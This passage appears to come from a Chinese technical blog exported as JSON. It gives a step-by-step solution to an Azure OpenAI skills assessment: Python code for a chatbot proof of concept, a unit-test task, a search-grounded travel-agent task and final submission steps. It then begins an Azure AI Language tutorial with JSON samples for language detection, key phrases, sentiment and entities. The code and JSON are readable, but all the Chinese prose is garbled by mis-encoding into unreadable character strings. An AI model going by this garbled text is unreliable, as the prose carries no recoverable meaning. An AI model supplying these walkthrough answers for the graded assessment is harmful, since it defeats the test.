ç¬¬äºŒæ¬¡éœ€å°†PoC.pyæ–‡ä»¶è¿›è¡Œå¤åˆ¶ç²˜è´´ä¸ºä»¥ä¸‹å†…å®¹ï¼Œå¹¶æŒ‰ä¸‹ctrl+sè¿›è¡Œä¿å­˜ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202import osimport requestsfrom dotenv import load_dotenvimport utilsfrom openai import AzureOpenAIimport asynciofrom openai import AsyncAzureOpenAI# Add OpenAI import. (Add code here)def main(): try: load_dotenv() utils.initLogFile() azure_oai_endpoint = os.getenv(&quot;AZURE_OAI_ENDPOINT&quot;) azure_oai_key = os.getenv(&quot;AZURE_OAI_KEY&quot;) azure_oai_model = os.getenv(&quot;AZURE_OAI_MODEL&quot;) # Define Azure OpenAI client (Add code here)################## client = AzureOpenAI( azure_endpoint=azure_oai_endpoint, api_key=azure_oai_key, api_version=&quot;2024-02-15-preview&quot; ) function_map = &#123; &quot;1&quot;: function1, &quot;2&quot;: function2, &quot;3&quot;: function3, &quot;4&quot;: function4 &#125; while True: print(&#x27;1: Validate PoC\\n&#x27; + &#x27;2: Company chatbot\\n&#x27; + &#x27;3: Developer tasks\\n&#x27; + &#x27;4: Use company data\\n&#x27; + &#x27;\\&#x27;quit\\&#x27; to exit the program\\n&#x27;) command = input(&#x27;Enter a number:&#x27;) if command.strip() in function_map: function_map[command](client, azure_oai_model) elif command.strip().lower() == &#x27;quit&#x27;: print(&#x27;Exiting program...&#x27;) break else: print(&quot;Invalid input. Please enter number 1, 2, 3, 4, or 5.&quot;) except Exception as ex: print(ex)# Task 1: Validate PoCdef function1(aiClient, aiModel): inputText = utils.getPromptInput(&quot;Task 1: Validate PoC&quot;, &quot;sample-text.txt&quot;) # Build messages to send to Azure OpenAI model. (Add code here) messages = [ &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: inputText&#125; ] # Define argument list (Add code here) apiParams = &#123; &quot;messages&quot;: messages, &#125; utils.writeLog(&quot;API Parameters:\\n&quot;, apiParams) # Call chat completion connection. (Add code here) # Use the call name and **apiParams to reference our argument list response = aiClient.chat.completions.create( model=aiModel, messages=messages, temperature=0.7, max_tokens=800 ) utils.writeLog(&quot;Response:\\n&quot;, str(response)) print(&quot;Response: &quot; + response.choices[0].message.content + &quot;\\n&quot;) return response# Task 2: Company chatbotdef function2(aiClient, aiModel): inputText = utils.getPromptInput(&quot;Task 2: Company chatbot&quot;, &quot;sample-text.txt&quot;) messages = [ &#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are a helpful assistant that responds in a casual tone. Each response should end with &#x27;Hope that helps! Thanks for using Contoso, Ltd.&#x27;&quot;&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;What is the best way to find if a company is hiring?&quot;&#125;, &#123;&quot;role&quot;: &quot;assistant&quot;, &quot;content&quot;: &quot;You can start by checking the company&#x27;s website, especially the careers section. Hope that helps! Thanks for using Contoso, Ltd.&quot;&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: inputText&#125; ] # Define argument list (Add code here) apiParams = &#123; &quot;model&quot;: aiModel, &quot;messages&quot;: messages, &quot;max_tokens&quot;: 1000, &quot;temperature&quot;: 0.5 &#125; utils.writeLog(&quot;API Parameters:\\n&quot;, apiParams) # Call chat completion connection. (Add code here) # Use the call name and **apiParams to reference our argument list response = aiClient.chat.completions.create(**apiParams) utils.writeLog(&quot;Response:\\n&quot;, str(response)) print(&quot;Response: &quot; + response.choices[0].message.content + &quot;\\n&quot;) return response# Task 3: Developer tasksdef function3(aiClient, aiModel): inputText = utils.getPromptInput(&quot;Task 3: Developer tasks&quot;, &quot;sample-text.txt&quot;) # Define system message based on the task system_message = &quot;Generate five unit tests for the function in fibonaci.py.&quot; messages = [ &#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: system_message&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: inputText&#125; ] # Define argument list (Add code here) apiParams = &#123; &quot;model&quot;: aiModel, &quot;messages&quot;: messages, &quot;max_tokens&quot;: 1000, &quot;temperature&quot;: 0.5 &#125; utils.writeLog(&quot;API Parameters:\\n&quot;, apiParams) # Call chat completion connection. (Add code here) # Use the call name and **apiParams to reference our argument list response = aiClient.chat.completions.create(**apiParams) utils.writeLog(&quot;Response:\\n&quot;, str(response)) print(&quot;Response: &quot; + response.choices[0].message.content + &quot;\\n&quot;) return response # Task 4: Use company datadef function4(aiClient, aiModel): inputText = utils.getPromptInput(&quot;Task 4: Use company data&quot;, &quot;sample-text.txt&quot;) # Build messages to send to Azure OpenAI model. (Add code here) search_endpoint = os.getenv(&quot;SEARCH_ENDPOINT&quot;) search_key = os.getenv(&quot;SEARCH_KEY&quot;) search_index = os.getenv(&quot;SEARCH_INDEX&quot;) # Perform the search query search_query = &#123; &quot;search&quot;: inputText, &quot;searchMode&quot;: &quot;any&quot;, &quot;queryType&quot;: &quot;simple&quot;, &quot;top&quot;: 5 # Adjust the number of results as needed &#125; headers = &#123; &quot;Content-Type&quot;: &quot;application/json&quot;, &quot;api-key&quot;: search_key &#125; search_url = f&quot;&#123;search_endpoint&#125;/indexes/&#123;search_index&#125;/docs/search?api-version=2021-04-30-Preview&quot; response = requests.post(search_url, headers=headers, json=search_query) search_results = response.json() # Extract relevant search results search_snippets = [result[&quot;content&quot;] for result in search_results[&quot;value&quot;]] search_content = &quot;\\n\\n&quot;.join(search_snippets) # Build messages for OpenAI with search results included messages = [ &#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are a helpful travel agent.&quot;&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: f&quot;&#123;inputText&#125;\\n\\nSearch Results:\\n&#123;search_content&#125;&quot;&#125; ] # Define connection and argument list (Add code here) apiParams = &#123; &quot;model&quot;: aiModel, &quot;messages&quot;: messages, &quot;max_tokens&quot;: 1000, &quot;temperature&quot;: 0.5 &#125; utils.writeLog(&quot;API Parameters:\\n&quot;, apiParams) # Call chat completion connection. Will be the same as function1 (Add code here) # Use the call name and **apiParams to reference our argument list response = aiClient.chat.completions.create(**apiParams) utils.writeLog(&quot;Response:\\n&quot;, str(response)) print(&quot;Response: &quot; + response.choices[0].message.content + &quot;\\n&quot;) return# Call main function. Do not modify.if __name__ == &#x27;__main__&#x27;: main() ç„¶åå°†c:\\filesä¸‹çš„fibonacci.pyï¼Œå¤åˆ¶åˆ°C:\\files\\AzureOpenAIPoc\\Pythonä¸‹ï¼Œé¦–å…ˆåˆ é™¤æ–‡ä»¶å¤¹ä¸­å·²æœ‰çš„sample-text.txtï¼Œå¹¶å°†fibonacci.pyé‡å‘½åä¸ºsample-text.txt(ï¼ï¼ï¼æ³¨æ„æ˜¯sample-text.txtï¼Œè€Œä¸æ˜¯sample-text.py)ã€‚ç„¶åå…³é—­åŸæ¥çš„å‘½ä»¤çª—å£ï¼Œé‡æ–°è¿è¡Œpython PoC.pyï¼Œå¹¶è¾“å…¥3ã€fileï¼ŒæŸ¥çœ‹ç»“æœæ˜¯å¦äº§ç”Ÿäº†5ä¸ªæµ‹è¯•ç”¨ä¾‹ã€‚ ç¬¬å››é¢˜ï¼ˆæœ€åä¸€é¢˜äº† åŠ æ²¹ï¼ï¼ï¼‰ç¬¬å››é¢˜å¯ä¾æ¬¡è¾“å…¥typeå’ŒWhen is the best time to visit London?(å¯ä½¿ç”¨ctrl+cå’Œctrl+vè¿›è¡Œå¤åˆ¶ç²˜è´´)è¿›è¡Œæé—®ã€‚ å®Œæˆä¸Šè¿°ä»£ç æµ‹è¯•åï¼Œç‚¹å‡»ç•Œé¢å³ä¸‹è§’ä¸­çš„ Submit Assessment æŒ‰é’®ï¼Œå¼¹å‡ºçš„ç¡®è®¤é¡µé¢åç‚¹å‡» Submit æŒ‰é’®ã€‚å®Œæˆå‡­è¯è¯ä¹¦","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://banjinmei.github.io/tags/Python/"},{"name":"Azure","slug":"Azure","permalink":"https://banjinmei.github.io/tags/Azure/"},{"name":"OpenAI","slug":"OpenAI","permalink":"https://banjinmei.github.io/tags/OpenAI/"}],"author":"mu"},{"title":"Azure OpenAI Language","slug":"Azure-OpenAI-Language","date":"2024-06-04T16:53:20.000Z","updated":"2024-06-05T16:17:02.000Z","comments":true,"path":"2024/06/05/Azure-OpenAI-Language/","permalink":"https://banjinmei.github.io/2024/06/05/Azure-OpenAI-Language/","excerpt":"","text":"ä½¿ç”¨ Azure AI è¯­è¨€åˆ†ææ–‡æœ¬æ¯å¤©ï¼Œä¸–ç•Œéƒ½ä¼šç”Ÿæˆå¤§é‡æ•°æ®ï¼›å¤§éƒ¨åˆ†å†…å®¹åŸºäºæ–‡æœ¬ï¼Œå…¶å½¢å¼åŒ…æ‹¬ç”µå­é‚®ä»¶ã€ç¤¾äº¤åª’ä½“æ–‡ç« ã€åœ¨çº¿è¯„è®ºã€ä¸šåŠ¡æ–‡æ¡£ç­‰ã€‚ é€šè¿‡åº”ç”¨ç»Ÿè®¡å’Œè¯­ä¹‰æ¨¡å‹çš„äººå·¥æ™ºèƒ½æŠ€æœ¯ï¼Œå¯ä»¥åˆ›å»ºä»åŸºäºæ–‡æœ¬çš„æ•°æ®ä¸­æå–å«ä¹‰å’Œè§è§£çš„åº”ç”¨ç¨‹åºã€‚ Azure AI è¯­è¨€ä¸ºå¯è½»æ¾é›†æˆåˆ°ä½ è‡ªå·±çš„åº”ç”¨ç¨‹åºä»£ç ä¸­çš„å¸¸è§æ–‡æœ¬åˆ†ææŠ€æœ¯æä¾› APIã€‚ åœ¨æœ¬æ¨¡å—ä¸­ï¼Œä½ å°†äº†è§£å¦‚ä½•ä½¿ç”¨ Azure AI è¯­è¨€æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š æ£€æµ‹æ–‡æœ¬ä¸­çš„è¯­è¨€ã€‚åˆ†ææ–‡æœ¬æƒ…ç»ªã€‚æå–å…³é”®çŸ­è¯­ã€å®ä½“å’Œé“¾æ¥å®ä½“ã€‚ é¢„é… Azure AI è¯­è¨€èµ„æºAzure AI è¯­è¨€æ—¨åœ¨å¸®åŠ©ä»æ–‡æœ¬ä¸­æå–ä¿¡æ¯ã€‚ å®ƒæä¾›å¯ç”¨äºä»¥ä¸‹å„é¡¹çš„åŠŸèƒ½ï¼š è¯­è¨€æ£€æµ‹ - ç¡®å®šç¼–å†™æ–‡æœ¬æ‰€ç”¨çš„è¯­è¨€ã€‚ å…³é”®çŸ­è¯­æå– - æ ‡è¯†æ–‡æœ¬ä¸­æŒ‡ç¤ºè¦ç‚¹çš„é‡è¦å•è¯å’ŒçŸ­è¯­ã€‚ æƒ…ç»ªåˆ†æ - é‡åŒ–æ–‡æœ¬çš„æ­£è´Ÿé¢æƒ…ç»ªç¨‹åº¦ã€‚ å‘½åå®ä½“è¯†åˆ« - æ£€æµ‹å¯¹å®ä½“çš„å¼•ç”¨ï¼ŒåŒ…æ‹¬äººå‘˜ã€ä½ç½®ã€æ—¶é—´æ®µã€ç»„ç»‡ç­‰ã€‚ å®ä½“é“¾æ¥ - é€šè¿‡æä¾›æŒ‡å‘ç»´åŸºç™¾ç§‘æ–‡ç« çš„å‚è€ƒé“¾æ¥æ¥æ ‡è¯†ç‰¹å®šå®ä½“ã€‚ ç”¨äºæ–‡æœ¬åˆ†æçš„ Azure èµ„æºè‹¥è¦ä½¿ç”¨ Azure AI è¯­è¨€æ¥åˆ†ææ–‡æœ¬ï¼Œå¿…é¡»åœ¨ Azure è®¢é˜…ä¸­ä¸ºå…¶é¢„é…èµ„æºã€‚ åœ¨ Azure è®¢é˜…ä¸­é¢„é…é€‚å½“çš„èµ„æºåï¼Œå¯ä»¥ä½¿ç”¨å…¶ç»ˆç»“ç‚¹åŠå…¶å¯†é’¥ä¹‹ä¸€ä»ä»£ç ä¸­è°ƒç”¨ Azure AI è¯­è¨€ APIã€‚ å¯ä»¥é€šè¿‡å‘ REST æ¥å£æäº¤ JSON æ ¼å¼çš„è¯·æ±‚ï¼Œæˆ–è€…é€šè¿‡ä½¿ç”¨ç‰¹å®šäºç¼–ç¨‹è¯­è¨€çš„ä»»ä½•å¯ç”¨ SDK æ¥è°ƒç”¨ Azure AI è¯­è¨€ APIã€‚ æ³¨æ„ æœ¬æ¨¡å—çš„åç»­å•å…ƒä¸­çš„ä»£ç ç¤ºä¾‹æ˜¾ç¤ºäº†ä¸ REST æ¥å£äº¤æ¢çš„ JSON è¯·æ±‚å’Œå“åº”ã€‚ ä½¿ç”¨ SDK æ—¶ï¼Œä¼šé€šè¿‡ç”¨äºå°è£…ç›¸åŒæ•°æ®å€¼çš„é€‚å½“å¯¹è±¡å’Œæ–¹æ³•å¯¹ JSON è¯·æ±‚è¿›è¡ŒæŠ½è±¡ã€‚ åœ¨æœ¬æ¨¡å—åé¢çš„ç»ƒä¹ ä¸­ï¼Œä½ å°†æœ‰æœºä¼šäº²è‡ªå°è¯•ä½¿ç”¨é€‚ç”¨äº C# æˆ– Python çš„ SDKã€‚ æ£€æµ‹è¯­è¨€Azure AI è¯­è¨€æ£€æµ‹ API ä¼šè¯„ä¼°æ–‡æœ¬è¾“å…¥ï¼Œå¹¶ä¸ºæäº¤çš„æ¯ä¸ªæ–‡æ¡£è¿”å›å¸¦æœ‰ä¸€ä¸ªæŒ‡ç¤ºåˆ†æå¼ºåº¦çš„åˆ†æ•°çš„è¯­è¨€æ ‡è¯†ç¬¦ã€‚ æ­¤åŠŸèƒ½å¯¹äºç”¨äºæ”¶é›†è¯­è¨€æœªçŸ¥çš„ä»»æ„æ–‡æœ¬çš„å†…å®¹å­˜å‚¨éå¸¸æœ‰ç”¨ã€‚ å¦ä¸€ç§æ–¹æ¡ˆå¯èƒ½æ¶‰åŠèŠå¤©æœºå™¨äººã€‚ å¦‚æœç”¨æˆ·ä½¿ç”¨èŠå¤©æœºå™¨äººå¯åŠ¨ä¼šè¯ï¼Œåˆ™è¯­è¨€æ£€æµ‹å¯ç”¨äºç¡®å®šç”¨æˆ·ä½¿ç”¨çš„è¯­è¨€ï¼Œè¿™æ ·ä½ ä¾¿å¯ä»¥ä½¿ç”¨é€‚å½“çš„è¯­è¨€é…ç½®æœºå™¨äººå“åº”ã€‚ å¯ä»¥è§£ææ­¤åˆ†æçš„ç»“æœï¼Œç¡®å®šè¾“å…¥æ–‡æ¡£ä¸­ä½¿ç”¨çš„è¯­è¨€ã€‚ å“åº”è¿˜ä¼šè¿”å›ä¸€ä¸ªåˆ†æ•°ï¼Œç”¨äºåæ˜ æ¨¡å‹çš„ç½®ä¿¡åº¦ï¼ˆä»‹äº 0 åˆ° 1 çš„å€¼ï¼‰ã€‚ è¯­è¨€æ£€æµ‹å¯åº”ç”¨äºæ–‡æ¡£æˆ–å•ä¸ªçŸ­è¯­ã€‚ è¯·æ³¨æ„ï¼Œæ–‡æ¡£å¤§å°å¿…é¡»å°äº 5,120 ä¸ªå­—ç¬¦ã€‚ å¤§å°é™åˆ¶é’ˆå¯¹æ¯ä¸ªæ–‡æ¡£ï¼Œæ¯ä¸ªé›†åˆé™åˆ¶ä¸º 1,000 ä¸ªé¡¹ (ID)ã€‚ æ­¤å¤„æ˜¾ç¤ºäº†å¯ä»¥åœ¨è¯·æ±‚æ­£æ–‡ä¸­å‘æœåŠ¡æäº¤çš„æ ¼å¼æ­£ç¡®çš„ JSON æœ‰æ•ˆè´Ÿè½½çš„ç¤ºä¾‹ï¼ŒåŒ…æ‹¬æ–‡æ¡£çš„é›†åˆï¼Œå…¶ä¸­æ¯ä¸ªæ–‡æ¡£éƒ½åŒ…å«å”¯ä¸€ ID ä»¥åŠè¦åˆ†æçš„æ–‡æœ¬ã€‚ ï¼ˆå¯é€‰ï¼‰å¯ä»¥æä¾› countryHint ä»¥æé«˜é¢„æµ‹æ€§èƒ½ã€‚ 12345678910111213141516171819&#123; &quot;kind&quot;: &quot;LanguageDetection&quot;, &quot;parameters&quot;: &#123; &quot;modelVersion&quot;: &quot;latest&quot; &#125;, &quot;analysisInput&quot;:&#123; &quot;documents&quot;:[ &#123; &quot;id&quot;: &quot;1&quot;, &quot;text&quot;: &quot;Hello world&quot;, &quot;countryHint&quot;: &quot;US&quot; &#125;, &#123; &quot;id&quot;: &quot;2&quot;, &quot;text&quot;: &quot;Bonjour tout le monde&quot; &#125; ] &#125;&#125; æœåŠ¡å°†è¿”å›ä¸€ä¸ª JSON å“åº”ï¼Œå…¶ä¸­åŒ…å«è¯·æ±‚æ­£æ–‡ä¸­æ¯ä¸ªæ–‡æ¡£çš„ç»“æœï¼ŒåŒ…æ‹¬é¢„æµ‹åˆ°çš„è¯­è¨€ä»¥åŠæŒ‡ç¤ºé¢„æµ‹çš„ç½®ä¿¡åº¦çš„å€¼ã€‚ ç½®ä¿¡åº¦æ˜¯ä»‹äº 0 å’Œ 1 çš„å€¼ï¼Œå€¼è¶Šæ¥è¿‘ 1 åˆ™ç½®ä¿¡åº¦è¶Šé«˜ã€‚ ä¸‹é¢æ˜¯æ˜ å°„åˆ°ä¸Šè¿°è¯·æ±‚ JSON çš„æ ‡å‡† JSON å“åº”çš„ç¤ºä¾‹ã€‚ 123456789101112131415161718192021222324252627&#123; &quot;kind&quot;: &quot;LanguageDetectionResults&quot;, &quot;results&quot;: &#123; &quot;documents&quot;: [ &#123; &quot;detectedLanguage&quot;: &#123; &quot;confidenceScore&quot;: 1, &quot;iso6391Name&quot;: &quot;en&quot;, &quot;name&quot;: &quot;English&quot; &#125;, &quot;id&quot;: &quot;1&quot;, &quot;warnings&quot;: [] &#125;, &#123; &quot;detectedLanguage&quot;: &#123; &quot;confidenceScore&quot;: 1, &quot;iso6391Name&quot;: &quot;fr&quot;, &quot;name&quot;: &quot;French&quot; &#125;, &quot;id&quot;: &quot;2&quot;, &quot;warnings&quot;: [] &#125; ], &quot;errors&quot;: [], &quot;modelVersion&quot;: &quot;2022-10-01&quot; &#125;&#125; åœ¨æˆ‘ä»¬çš„ç¤ºä¾‹ä¸­ï¼Œæ‰€æœ‰è¯­è¨€çš„ç½®ä¿¡åº¦å‡ä¸º 1ï¼Œè¿™ä¸»è¦æ˜¯å› ä¸ºæ–‡æœ¬ç›¸å¯¹ç®€å•ï¼Œæ˜“äºè¯†åˆ«å…¶è¯­è¨€ã€‚ å¦‚æœä¼ å…¥åŒ…å«å¤šè¯­è¨€å†…å®¹çš„æ–‡æ¡£ï¼Œè¯¥æœåŠ¡çš„è¡Œä¸ºä¼šæœ‰æ‰€ä¸åŒã€‚ åŒä¸€æ–‡æ¡£ä¸­çš„æ··åˆè¯­è¨€å†…å®¹å°†è¿”å›å†…å®¹ä¸­ä»£è¡¨æ€§æœ€å¼ºä½†æ­£è¯„çº§è¾ƒä½çš„è¯­è¨€ï¼Œè¿™åæ˜ è¯¥è¯„ä¼°çš„è¾¹ç•Œå¼ºåº¦ã€‚ åœ¨ä»¥ä¸‹ç¤ºä¾‹ä¸­ï¼Œè¾“å…¥ä¸­åŒ…å«è‹±è¯­ã€è¥¿ç­ç‰™è¯­å’Œæ³•è¯­ã€‚ åˆ†æå™¨ä½¿ç”¨æ–‡æœ¬çš„ç»Ÿè®¡åˆ†ææ¥ç¡®å®šä¸»è¦è¯­è¨€ã€‚ 12345678&#123; &quot;documents&quot;: [ &#123; &quot;id&quot;: &quot;1&quot;, &quot;text&quot;: &quot;Hello, I would like to take a class at your University. Â¿Se ofrecen clases en espaÃ±ol? Es mi primera lengua y mÃ¡s fÃ¡cil para escribir. Que diriez-vous des cours en franÃ§ais?&quot; &#125; ]&#125; ä¸‹é¢çš„ç¤ºä¾‹æ˜¾ç¤ºäº†æ­¤å¤šè¯­è¨€ç¤ºä¾‹çš„å“åº”ã€‚ 123456789101112131415&#123; &quot;documents&quot;: [ &#123; &quot;id&quot;: &quot;1&quot;, &quot;detectedLanguage&quot;: &#123; &quot;name&quot;: &quot;Spanish&quot;, &quot;iso6391Name&quot;: &quot;es&quot;, &quot;confidenceScore&quot;: 0.9375 &#125;, &quot;warnings&quot;: [] &#125; ], &quot;errors&quot;: [], &quot;modelVersion&quot;: &quot;2022-10-01&quot;&#125; æœ€åè¦è€ƒè™‘çš„æ˜¯è¯­è¨€å†…å®¹å¤šä¹‰æ€§çš„æƒ…å†µã€‚ å¦‚æœæäº¤äº†åˆ†æå™¨æ— æ³•åˆ†æçš„æ–‡æœ¬å†…å®¹ï¼Œåˆ™å¯èƒ½ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µï¼Œä¾‹å¦‚ç”±äºåœ¨å°†æ–‡æœ¬è½¬æ¢ä¸ºå­—ç¬¦ä¸²å˜é‡æ—¶å‡ºç°å­—ç¬¦ç¼–ç é—®é¢˜ã€‚ è¿™æ ·ä¸€æ¥ï¼Œè¯­è¨€åç§°å’Œ ISO ä»£ç çš„å“åº”å°†æŒ‡ç¤º (unknown)ï¼Œåˆ†æ•°å€¼å°†è¿”å›ä¸º 0ã€‚ ä¸‹é¢çš„ç¤ºä¾‹æ˜¾ç¤ºå“åº”çš„å¤–è§‚ã€‚ 123456789101112131415&#123; &quot;documents&quot;: [ &#123; &quot;id&quot;: &quot;1&quot;, &quot;detectedLanguage&quot;: &#123; &quot;name&quot;: &quot;(Unknown)&quot;, &quot;iso6391Name&quot;: &quot;(Unknown)&quot;, &quot;confidenceScore&quot;: 0.0 &#125;, &quot;warnings&quot;: [] &#125; ], &quot;errors&quot;: [], &quot;modelVersion&quot;: &quot;2022-10-01&quot;&#125; æå–å…³é”®çŸ­è¯­å…³é”®çŸ­è¯­æå–æ˜¯è¿™æ ·ä¸€ä¸ªè¿‡ç¨‹ï¼Œå³è¯„ä¼°ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡æ¡£çš„æ–‡æœ¬ï¼Œç„¶åå›´ç»•æ–‡æ¡£ä¸Šä¸‹æ–‡è¯†åˆ«å‡ºè¦ç‚¹ã€‚ å…³é”®çŸ­è¯­æå–æœ€é€‚åˆå¤§å‹æ–‡æ¡£ï¼ˆå¯åˆ†æçš„æœ€å¤§å¤§å°ä¸º 5,120 ä¸ªå­—ç¬¦ï¼‰ã€‚ ä¸è¯­è¨€æ£€æµ‹ä¸€æ ·ï¼Œä½¿ç”¨ REST æ¥å£å¯ä»¥æäº¤ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡æ¡£è¿›è¡Œåˆ†æã€‚ 12345678910111213141516171819202122&#123; &quot;kind&quot;: &quot;KeyPhraseExtraction&quot;, &quot;parameters&quot;: &#123; &quot;modelVersion&quot;: &quot;latest&quot; &#125;, &quot;analysisInput&quot;:&#123; &quot;documents&quot;:[ &#123; &quot;id&quot;: &quot;1&quot;, &quot;language&quot;: &quot;en&quot;, &quot;text&quot;: &quot;You must be the change you wish to see in the world.&quot; &#125;, &#123; &quot;id&quot;: &quot;2&quot;, &quot;language&quot;: &quot;en&quot;, &quot;text&quot;: &quot;The journey of a thousand miles begins with a single step.&quot; &#125; ] &#125;&#125; å“åº”åŒ…å«åœ¨æ¯ä¸ªæ–‡æ¡£ä¸­æ£€æµ‹åˆ°çš„å…³é”®çŸ­è¯­çš„åˆ—è¡¨ï¼š 123456789101112131415161718192021222324252627&#123; &quot;kind&quot;: &quot;KeyPhraseExtractionResults&quot;, &quot;results&quot;: &#123; &quot;documents&quot;: [ &#123; &quot;id&quot;: &quot;1&quot;, &quot;keyPhrases&quot;: [ &quot;change&quot;, &quot;world&quot; ], &quot;warnings&quot;: [] &#125;, &#123; &quot;id&quot;: &quot;2&quot;, &quot;keyPhrases&quot;: [ &quot;miles&quot;, &quot;single step&quot;, &quot;journey&quot; ], &quot;warnings&quot;: [] &#125;], &quot;errors&quot;: [], &quot;modelVersion&quot;: &quot;2021-06-01&quot; &#125;&#125; åˆ†ææƒ…ç»ªæƒ…ç»ªåˆ†æç”¨äºè¯„ä¼°æ–‡æœ¬æ–‡æ¡£çš„æ­£è´Ÿé¢æƒ…ç»ªç¨‹åº¦ï¼Œè¿™åœ¨å„ç§å·¥ä½œè´Ÿè½½ä¸­éå¸¸æœ‰ç”¨ï¼Œä¾‹å¦‚ï¼š é€šè¿‡åŸºäºè¯„è®ºé‡åŒ–æƒ…ç»ªæ¥è¯„ä¼°ç”µå½±ã€ä¹¦ç±æˆ–äº§å“ã€‚ ç¡®å®šå®¢æˆ·æœåŠ¡å¯¹é€šè¿‡ç”µå­é‚®ä»¶æˆ–ç¤¾äº¤åª’ä½“æ¶ˆæ¯ä¼ é€æ”¶åˆ°çš„å‡½ä»¶çš„å“åº”çš„ä¼˜å…ˆçº§ã€‚ ä½¿ç”¨ Azure AI è¯­è¨€è¯„ä¼°æƒ…ç»ªæ—¶ï¼Œå“åº”åŒ…æ‹¬å‘æœåŠ¡æäº¤çš„æ¯ä¸ªæ–‡æ¡£çš„æ€»ä½“æ–‡æ¡£æƒ…ç»ªå’Œå•ä¸ªå¥å­æƒ…ç»ªã€‚ ä¾‹å¦‚ï¼Œå¯ä»¥æäº¤å•ä¸ªæ–‡æ¡£è¿›è¡Œæƒ…ç»ªåˆ†æï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 12345678910111213141516&#123; &quot;kind&quot;: &quot;SentimentAnalysis&quot;, &quot;parameters&quot;: &#123; &quot;modelVersion&quot;: &quot;latest&quot; &#125;, &quot;analysisInput&quot;: &#123; &quot;documents&quot;: [ &#123; &quot;id&quot;: &quot;1&quot;, &quot;language&quot;: &quot;en&quot;, &quot;text&quot;: &quot;Good morning!&quot; &#125; ] &#125;&#125; æ¥è‡ªæœåŠ¡çš„å“åº”å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š 1234567891011121314151617181920212223242526272829303132&#123; &quot;kind&quot;: &quot;SentimentAnalysisResults&quot;, &quot;results&quot;: &#123; &quot;documents&quot;: [ &#123; &quot;id&quot;: &quot;1&quot;, &quot;sentiment&quot;: &quot;positive&quot;, &quot;confidenceScores&quot;: &#123; &quot;positive&quot;: 0.89, &quot;neutral&quot;: 0.1, &quot;negative&quot;: 0.01 &#125;, &quot;sentences&quot;: [ &#123; &quot;sentiment&quot;: &quot;positive&quot;, &quot;confidenceScores&quot;: &#123; &quot;positive&quot;: 0.89, &quot;neutral&quot;: 0.1, &quot;negative&quot;: 0.01 &#125;, &quot;offset&quot;: 0, &quot;length&quot;: 13, &quot;text&quot;: &quot;Good morning!&quot; &#125; ], &quot;warnings&quot;: [] &#125; ], &quot;errors&quot;: [], &quot;modelVersion&quot;: &quot;2022-11-01&quot; &#125;&#125; å¥å­æƒ…ç»ªåŸºäº 0 åˆ° 1 ä¹‹é—´çš„æ­£é¢ã€è´Ÿé¢å’Œä¸­æ€§åˆ†ç±»å€¼çš„ç½®ä¿¡åº¦åˆ†æ•°ã€‚ æ€»ä½“æ–‡æ¡£æƒ…ç»ªåŸºäºå¥å­ï¼š å¦‚æœæ‰€æœ‰å¥å­éƒ½ä¸ºä¸­æ€§ï¼Œåˆ™æ€»ä½“æƒ…ç»ªä¸ºä¸­æ€§ã€‚ å¦‚æœå¥å­åˆ†ç±»ä»…åŒ…æ‹¬æ­£é¢å’Œä¸­æ€§ï¼Œåˆ™æ€»ä½“æƒ…ç»ªä¸ºæ­£é¢ã€‚ å¦‚æœå¥å­åˆ†ç±»ä»…åŒ…æ‹¬è´Ÿé¢å’Œä¸­æ€§ï¼Œåˆ™æ€»ä½“æƒ…ç»ªä¸ºè´Ÿé¢ã€‚ å¦‚æœå¥å­åˆ†ç±»åŒ…æ‹¬æ­£é¢å’Œè´Ÿé¢ï¼Œåˆ™æ€»ä½“æƒ…ç»ªæ˜¯æ··åˆçš„ã€‚ æå–å®ä½“å‘½åå®ä½“è¯†åˆ«æ ‡è¯†æ–‡æœ¬ä¸­æåŠçš„å®ä½“ã€‚ å®ä½“æŒ‰ç±»åˆ«å’Œå­ç±»åˆ«åˆ†ç»„ï¼Œä¾‹å¦‚ï¼š äººå‘˜ ä½ç½® DateTime ç»„ç»‡ åœ°å€ ç”µå­é‚®ä»¶ URL å®ä½“è¯†åˆ«çš„è¾“å…¥ç±»ä¼¼äºå…¶ä»–è¯­è¨€ Azure AI è¯­è¨€ API å‡½æ•°çš„è¾“å…¥ï¼š 123456789101112131415&#123; &quot;kind&quot;: &quot;EntityRecognition&quot;, &quot;parameters&quot;: &#123; &quot;modelVersion&quot;: &quot;latest&quot; &#125;, &quot;analysisInput&quot;: &#123; &quot;documents&quot;: [ &#123; &quot;id&quot;: &quot;1&quot;, &quot;language&quot;: &quot;en&quot;, &quot;text&quot;: &quot;Joe went to London on Saturday&quot; &#125; ] &#125;&#125; å“åº”åŒ…æ‹¬åœ¨æ¯ä¸ªæ–‡æ¡£ä¸­æ‰¾åˆ°çš„åˆ†ç±»å®ä½“çš„åˆ—è¡¨ï¼š 1234567891011121314151617181920212223242526272829303132333435363738&#123; &quot;kind&quot;: &quot;EntityRecognitionResults&quot;, &quot;results&quot;: &#123; &quot;documents&quot;:[ &#123; &quot;entities&quot;:[ &#123; &quot;text&quot;:&quot;Joe&quot;, &quot;category&quot;:&quot;Person&quot;, &quot;offset&quot;:0, &quot;length&quot;:3, &quot;confidenceScore&quot;:0.62 &#125;, &#123; &quot;text&quot;:&quot;London&quot;, &quot;category&quot;:&quot;Location&quot;, 